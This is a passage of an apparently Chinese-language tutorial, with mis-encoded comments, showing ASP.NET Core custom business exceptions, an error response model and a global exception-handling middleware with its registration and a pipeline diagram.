    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-built_in">int</span> HttpStatusCode { <span class="hljs-keyword">get</span>; }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é”™è¯¯ä»£ç ï¼ˆç»™å‰ç«¯çš„ï¼‰</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä¾‹å¦‚ï¼š"NOT_FOUND", "VALIDATION_ERROR", "UNAUTHORIZED"</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‰ç«¯å¯ä»¥æ ¹æ®è¿™ä¸ªä»£ç åšä¸åŒçš„å¤„ç†</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> ErrorCode { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BusinessException</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">string</span> errorCode</span>) 
        : <span class="hljs-title">base</span>(<span class="hljs-params">message</span>)</span>
    {
        ErrorCode = errorCode;
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BusinessException</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">string</span> errorCode, Exception innerException</span>) 
        : <span class="hljs-title">base</span>(<span class="hljs-params">message, innerException</span>)</span>
    {
        ErrorCode = errorCode;
    }
}
</code></pre>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> èµ„æºæœªæ‰¾åˆ°å¼‚å¸¸</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> ä»€ä¹ˆæ—¶å€™æŠ›ï¼Ÿ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> å½“æŸ¥è¯¢æ•°æ®åº“ï¼Œç”¨æˆ·/äº§å“/è®¢å•ç­‰èµ„æºä¸å­˜åœ¨æ—¶</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> HTTP çŠ¶æ€ç æ˜¯å¤šå°‘ï¼Ÿ404</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é”™è¯¯ä»£ç æ˜¯ä»€ä¹ˆï¼ŸNOT_FOUND</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">NotFoundException</span> :  <span class="hljs-title">BusinessException</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-built_in">int</span> HttpStatusCode =&gt; <span class="hljs-number">404</span>;  <span class="hljs-comment">// ğŸ”‘ å…³é”®ï¼šå®šä¹‰çŠ¶æ€ç æ˜¯ 404</span>

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">NotFoundException</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message</span>) 
        : <span class="hljs-title">base</span>(<span class="hljs-params">message, <span class="hljs-string">"NOT_FOUND"</span></span>)  <span class="hljs-comment">// ğŸ”‘ å…³é”®ï¼šå®šä¹‰é”™è¯¯ä»£ç </span></span>
    {
    }
}
</code></pre>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> è¯·æ±‚è¿‡äºé¢‘ç¹å¼‚å¸¸ï¼ˆé™æµï¼‰</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> ä»€ä¹ˆæ—¶å€™æŠ›ï¼Ÿ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> å½“ç”¨æˆ·è¯·æ±‚å¤ªé¢‘ç¹ï¼Œè§¦å‘é™æµè§„åˆ™æ—¶</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> HTTP çŠ¶æ€ç æ˜¯å¤šå°‘ï¼Ÿ429 Too Many Requests</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é”™è¯¯ä»£ç æ˜¯ä»€ä¹ˆï¼ŸTOO_MANY_REQUESTS</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">TooManyRequestsException</span> : <span class="hljs-title">BusinessException</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-built_in">int</span> HttpStatusCode =&gt; <span class="hljs-number">429</span>;  <span class="hljs-comment">// ğŸ”‘ å…³é”®ï¼šå®šä¹‰çŠ¶æ€ç æ˜¯ 429</span>

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TooManyRequestsException</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message</span>) 
        : <span class="hljs-title">base</span>(<span class="hljs-params">message, <span class="hljs-string">"TOO_MANY_REQUESTS"</span></span>)  <span class="hljs-comment">// ğŸ”‘ å…³é”®ï¼šå®šä¹‰é”™è¯¯ä»£ç </span></span>
    {
    }
}
</code></pre>
<h3 data-id="heading-18">é”™è¯¯å“åº”æ¨¡å‹</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é”™è¯¯å“åº”æ¨¡å‹</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> å½“å¼‚å¸¸è¢«å¤„ç†åï¼Œä¸­é—´ä»¶ä¼šç”Ÿæˆè¿™æ ·çš„ JSON å“åº”è¿”å›ç»™å®¢æˆ·ç«¯</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> ç¤ºä¾‹ï¼š</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> {</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span>   "statusCode": 404,</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span>   "code": "NOT_FOUND",</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span>   "message": "ç”¨æˆ· 123 ä¸å­˜åœ¨",</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span>   "timestamp": "2026-01-14T10:30:45Z"</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> }</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ErrorResponse</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> HTTP çŠ¶æ€ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‘Šè¯‰å®¢æˆ·ç«¯è¿™æ˜¯ä»€ä¹ˆç±»å‹çš„é”™è¯¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä¾‹å¦‚ï¼š400(å‚æ•°é”™è¯¯), 404(æœªæ‰¾åˆ°), 429(å¤ªå¤šè¯·æ±‚), 500(æœåŠ¡å™¨é”™è¯¯)</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> StatusCode { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é”™è¯¯ä»£ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‰ç«¯å¯ä»¥æ ¹æ®è¿™ä¸ªä»£ç åšé’ˆå¯¹æ€§çš„å¤„ç†</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä¾‹å¦‚ï¼š</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> - code = "NOT_FOUND" â†’ æ˜¾ç¤º"èµ„æºä¸å­˜åœ¨"</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> - code = "VALIDATION_ERROR" â†’ æ˜¾ç¤º"å‚æ•°é”™è¯¯ï¼Œè¯·æ£€æŸ¥"</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> - code = "TOO_MANY_REQUESTS" â†’ æ˜¾ç¤º"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•"</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Code { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é”™è¯¯ä¿¡æ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ç»™ç”¨æˆ·çœ‹çš„ï¼Œè¯´æ˜å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆ</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä¾‹å¦‚ï¼š"ç”¨æˆ· 123 ä¸å­˜åœ¨"</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Message { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ—¶é—´æˆ³</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è®°å½•å¼‚å¸¸å‘ç”Ÿçš„æ—¶é—´</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-keyword">public</span> DateTime Timestamp { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = DateTime.UtcNow;
}
</code></pre>
<h3 data-id="heading-19">å…¨å±€å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> ä½œç”¨ï¼š</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 1. æ‹¦æˆªæ•´ä¸ªåº”ç”¨ä¸­å‘ç”Ÿçš„å¼‚å¸¸</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 2. æ ¹æ®å¼‚å¸¸ç±»å‹åˆ¤æ–­åº”è¯¥è¿”å›ä»€ä¹ˆ HTTP çŠ¶æ€ç </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 3. ç”Ÿæˆå‹å¥½çš„ JSON é”™è¯¯å“åº”</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 4. è¿”å›ç»™å®¢æˆ·ç«¯</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªä¸­é—´ä»¶ï¼Ÿ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - å¦‚æœä¸å¤„ç†å¼‚å¸¸ï¼Œç¨‹åºä¼šå´©æºƒ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - å¦‚æœæ¯ä¸ª Controller éƒ½è‡ªå·±å¤„ç†å¼‚å¸¸ï¼Œä»£ç é‡å¤</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - æœ‰äº†ä¸­é—´ä»¶ï¼Œæ‰€æœ‰å¼‚å¸¸éƒ½åœ¨è¿™é‡Œç»Ÿä¸€å¤„ç†</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ‰§è¡Œä½ç½®ï¼Ÿ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> å¿…é¡»åœ¨ Program.cs ä¸­æœ€å‰é¢æ³¨å†Œï¼š</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> app.UseMiddleware<span class="hljs-doctag">&lt;ExceptionHandlingMiddleware&gt;</span>();</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> è¿™æ ·æ‰èƒ½æ•è·æ‰€æœ‰ä¸‹å±‚ä»£ç çš„å¼‚å¸¸</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ExceptionHandlingMiddleware</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> RequestDelegate _next;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;ExceptionHandlingMiddleware&gt; _logger;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExceptionHandlingMiddleware</span>(<span class="hljs-params">
        RequestDelegate next,
        ILogger&lt;ExceptionHandlingMiddleware&gt; logger</span>)</span>
    {
        _next = next;
        _logger = logger;
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä¸­é—´ä»¶çš„æ‰§è¡Œæ–¹æ³•</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ‰§è¡Œæµç¨‹ï¼š</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 1. try å—ï¼šæ‰§è¡Œä¸‹é¢æ‰€æœ‰çš„ä¸­é—´ä»¶å’Œä»£ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 2. å¦‚æœæ²¡æœ‰å¼‚å¸¸ï¼šæ­£å¸¸è¿”å›å“åº”</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 3. å¦‚æœæœ‰å¼‚å¸¸ï¼šcatch å—æ•è·ï¼Œè¿›è¡Œå¤„ç†</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">InvokeAsync</span>(<span class="hljs-params">HttpContext context</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// ğŸ”‘ æ‰§è¡Œä¸‹é¢æ‰€æœ‰çš„ä¸­é—´ä»¶å’Œ Controller ä»£ç </span>
            <span class="hljs-comment">// ä¾‹å¦‚ï¼šè·¯ç”±ã€è®¤è¯ã€æˆæƒã€Controller...  </span>
            <span class="hljs-comment">// å¦‚æœè¿™äº›åœ°æ–¹æŠ›å¼‚å¸¸ï¼Œä¼šç›´æ¥è·³åˆ° catch å—</span>
            <span class="hljs-keyword">await</span> _next(context);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            <span class="hljs-comment">// ğŸ›‘ æ‰€æœ‰å¼‚å¸¸éƒ½ä¼šåœ¨è¿™é‡Œè¢«æ•è·</span>
            _logger.LogError(ex, <span class="hljs-string">"å‘ç”Ÿæœªå¤„ç†çš„å¼‚å¸¸"</span>);
            
            <span class="hljs-comment">// è°ƒç”¨å¼‚å¸¸å¤„ç†æ–¹æ³•</span>
            <span class="hljs-keyword">await</span> HandleExceptionAsync(context, ex);
        }
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†å¼‚å¸¸çš„æ–¹æ³•</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é€»è¾‘ï¼š</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 1. æ ¹æ®å¼‚å¸¸çš„ç±»å‹åˆ¤æ–­åº”è¯¥è¿”å›ä»€ä¹ˆçŠ¶æ€ç å’Œé”™è¯¯ä»£ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 2. ç”Ÿæˆ ErrorResponse å¯¹è±¡</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 3. è®¾ç½® HTTP å“åº”çŠ¶æ€ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> 4. è¿”å› JSON æ ¼å¼çš„é”™è¯¯ä¿¡æ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleExceptionAsync</span>(<span class="hljs-params">
        HttpContext context,
        Exception exception</span>)</span>
    {
        <span class="hljs-comment">// è®¾ç½®å“åº”çš„å†…å®¹ç±»å‹ä¸º JSON</span>
        context.Response.ContentType = <span class="hljs-string">"application/json; charset=utf-8"</span>;

        <span class="hljs-comment">// ğŸ”‘ æ ¹æ®å¼‚å¸¸ç±»å‹åˆ¤æ–­ï¼Œç”Ÿæˆä¸åŒçš„å“åº”</span>
        ErrorResponse errorResponse;
        <span class="hljs-built_in">int</span> statusCode;

        <span class="hljs-keyword">if</span> (exception <span class="hljs-keyword">is</span> BusinessException businessEx)
        {
            <span class="hljs-comment">// ğŸ“Œ ä¸šåŠ¡å¼‚å¸¸çš„å¤„ç†</span>
            <span class="hljs-comment">// businessEx.HttpStatusCode ä¼šæ ¹æ®å¼‚å¸¸ç±»å‹è¿”å›ä¸åŒçš„å€¼</span>
            <span class="hljs-comment">// ä¾‹å¦‚ï¼š</span>
            <span class="hljs-comment">// - NotFoundException.HttpStatusCode = 404</span>
            <span class="hljs-comment">// - TooManyRequestsException.HttpStatusCode = 429</span>
            
            statusCode = businessEx.HttpStatusCode;
            errorResponse = <span class="hljs-keyword">new</span> ErrorResponse
            {
                StatusCode = statusCode,
                Code = businessEx.ErrorCode,
                Message = businessEx.Message
            };
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exception <span class="hljs-keyword">is</span> ArgumentNullException argNullEx)
        {
            <span class="hljs-comment">// ğŸ“Œ å‚æ•°ä¸º null çš„å¼‚å¸¸ â†’ 400 Bad Request</span>
            statusCode = <span class="hljs-number">400</span>;
            errorResponse = <span class="hljs-keyword">new</span> ErrorResponse
            {
                StatusCode = <span class="hljs-number">400</span>,
                Code = <span class="hljs-string">"BAD_REQUEST"</span>,
                Message = <span class="hljs-string">$"å‚æ•°ä¸èƒ½ä¸ºç©º:  <span class="hljs-subst">{argNullEx.ParamName}</span>"</span>
            };
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exception <span class="hljs-keyword">is</span> ArgumentException argEx)
        {
            <span class="hljs-comment">// ğŸ“Œ å‚æ•°ä¸åˆæ³•çš„å¼‚å¸¸ â†’ 400 Bad Request</span>
            statusCode = <span class="hljs-number">400</span>;
            errorResponse = <span class="hljs-keyword">new</span> ErrorResponse
            {
                StatusCode = <span class="hljs-number">400</span>,
                Code = <span class="hljs-string">"BAD_REQUEST"</span>,
                Message = argEx.Message
            };
        }
        <span class="hljs-keyword">else</span>
        {
            <span class="hljs-comment">// ğŸ“Œ æœªé¢„æœŸçš„å¼‚å¸¸ â†’ 500 Internal Server Error</span>
            <span class="hljs-comment">// è¿™ä¸ªçŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨å‡ºé”™äº†</span>
            statusCode = <span class="hljs-number">500</span>;
            errorResponse = <span class="hljs-keyword">new</span> ErrorResponse
            {
                StatusCode = <span class="hljs-number">500</span>,
                Code = <span class="hljs-string">"INTERNAL_SERVER_ERROR"</span>,
                Message = <span class="hljs-string">"æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œè¯·ç¨åé‡è¯•"</span>
                <span class="hljs-comment">// ğŸ”’ æ³¨æ„ï¼šä¸è¦æš´éœ²å¼‚å¸¸çš„åŸå§‹ä¿¡æ¯ç»™å‰ç«¯</span>
                <span class="hljs-comment">// è¿™æ ·å¯ä»¥ä¿æŠ¤ç³»ç»Ÿçš„å®‰å…¨</span>
            };
        }

        <span class="hljs-comment">// è®¾ç½® HTTP å“åº”çš„çŠ¶æ€ç </span>
        <span class="hljs-comment">// è¿™ä¸ªçŠ¶æ€ç éå¸¸é‡è¦ï¼Œå®¢æˆ·ç«¯ä¼šæ ¹æ®è¿™ä¸ªæ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>
        <span class="hljs-comment">// ä¾‹å¦‚ï¼š</span>
        <span class="hljs-comment">// - 200: æˆåŠŸ</span>
        <span class="hljs-comment">// - 400: å®¢æˆ·ç«¯é”™è¯¯ï¼ˆå‚æ•°é—®é¢˜ï¼‰</span>
        <span class="hljs-comment">// - 404: èµ„æºæœªæ‰¾åˆ°</span>
        <span class="hljs-comment">// - 429: è¯·æ±‚è¿‡äºé¢‘ç¹</span>
        <span class="hljs-comment">// - 500: æœåŠ¡å™¨é”™è¯¯</span>
        context.Response.StatusCode = statusCode;

        <span class="hljs-comment">// å°†é”™è¯¯å“åº”åºåˆ—åŒ–ä¸º JSON å¹¶è¿”å›ç»™å®¢æˆ·ç«¯</span>
        <span class="hljs-keyword">await</span> context. Response.WriteAsJsonAsync(errorResponse);
    }
}
</code></pre>
<h4 data-id="heading-20">æ³¨å†Œä¸­é—´ä»¶</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-tag">var</span> app = builder<span class="hljs-selector-class">.Build</span>();

<span class="hljs-comment">// ğŸ”‘ ã€å…³é”®ã€‘å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶å¿…é¡»åœ¨æœ€å‰é¢æ³¨å†Œ</span>
<span class="hljs-comment">// è¿™æ ·æ‰èƒ½æ•è·ä¸‹é¢æ‰€æœ‰ä¸­é—´ä»¶å’Œä»£ç çš„å¼‚å¸¸</span>
app<span class="hljs-selector-class">.UseMiddleware</span>&lt;ExceptionHandlingMiddleware&gt;();

<span class="hljs-comment">// å…¶ä»–ä¸­é—´ä»¶... </span>
app<span class="hljs-selector-class">.UseRouting</span>();
app<span class="hljs-selector-class">.MapControllers</span>();

app<span class="hljs-selector-class">.Run</span>();
</code></pre>
<h4 data-id="heading-21">ç®¡é“å¤„ç†æµç¨‹</h4>
<pre><code class="hljs language-csharp" lang="csharp">â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

                    ã€è¯·æ±‚è¿›æ¥ - å‘ä¸‹æµåŠ¨ã€‘

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

                        å®¢æˆ·ç«¯è¯·æ±‚
                             â†“
                    GET /api/user/<span class="hljs-number">123</span>
                             â†“
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚          Pipelineï¼šä¸­é—´ä»¶ç®¡é“ (æŒ‰é¡ºåº)           â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚                                                â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">1</span>å±‚ã€‘å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶                        â”‚
        â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
        â”‚  â”‚ <span class="hljs-keyword">try</span> {                                   â”‚  â”‚
        â”‚  â”‚   <span class="hljs-keyword">await</span> _next(context)  â† è¿›å…¥ <span class="hljs-keyword">try</span> å—  â”‚  â”‚
        â”‚  â”‚                                         â”‚  â”‚
        â”‚  â”‚ } <span class="hljs-keyword">catch</span> (Exception ex) {                â”‚  â”‚
        â”‚  â”‚   <span class="hljs-comment">// å°†åœ¨è¿™é‡Œæ•è·ä¸‹é¢æ‰€æœ‰çš„å¼‚å¸¸         â”‚  â”‚</span>
        â”‚  â”‚ }                                       â”‚  â”‚
        â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
        â”‚              â†“                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">2</span>å±‚ã€‘æ—¥å¿—ä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ è®°å½•è¯·æ±‚ä¿¡æ¯                              â”‚
        â”‚  â””â”€ <span class="hljs-keyword">await</span> _next(context)                      â”‚
        â”‚              â†“                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">3</span>å±‚ã€‘è®¤è¯ä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ æ£€æŸ¥ Token                                â”‚
        â”‚  â”œâ”€ éªŒè¯ç”¨æˆ·èº«ä»½                              â”‚
        â”‚  â””â”€ <span class="hljs-keyword">await</span> _next(context)                      â”‚
        â”‚              â†“                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">4</span>å±‚ã€‘æˆæƒä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ æ£€æŸ¥æƒé™                                  â”‚
        â”‚  â””â”€ <span class="hljs-keyword">await</span> _next(context)                      â”‚
        â”‚              â†“                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">5</span>å±‚ã€‘è·¯ç”±ä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ åŒ¹é…è·¯ç”±è§„åˆ™                              â”‚
        â”‚  â””â”€ ç¡®å®šä½¿ç”¨å“ªä¸ª Controller                   â”‚
        â”‚                                                â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†“
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚   ã€Controllerã€‘æ§åˆ¶å™¨            â”‚
            â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚                                 â”‚
            â”‚  [HttpGet(<span class="hljs-string">"{id}"</span>)]              â”‚
            â”‚  <span class="hljs-function"><span class="hljs-keyword">public</span> IActionResult <span class="hljs-title">Get</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> id</span>)
            â”‚</span>  {                              â”‚
            â”‚    <span class="hljs-comment">// ä» DI å®¹å™¨è·å–æœåŠ¡         â”‚</span>
            â”‚    <span class="hljs-keyword">var</span> user = _userService      â”‚  â† DI å®¹å™¨æ³¨å…¥
            â”‚                 . GetUser(id);   â”‚
            â”‚                                 â”‚
            â”‚    <span class="hljs-keyword">return</span> Ok(user);             â”‚
            â”‚  }                              â”‚
            â”‚                                 â”‚
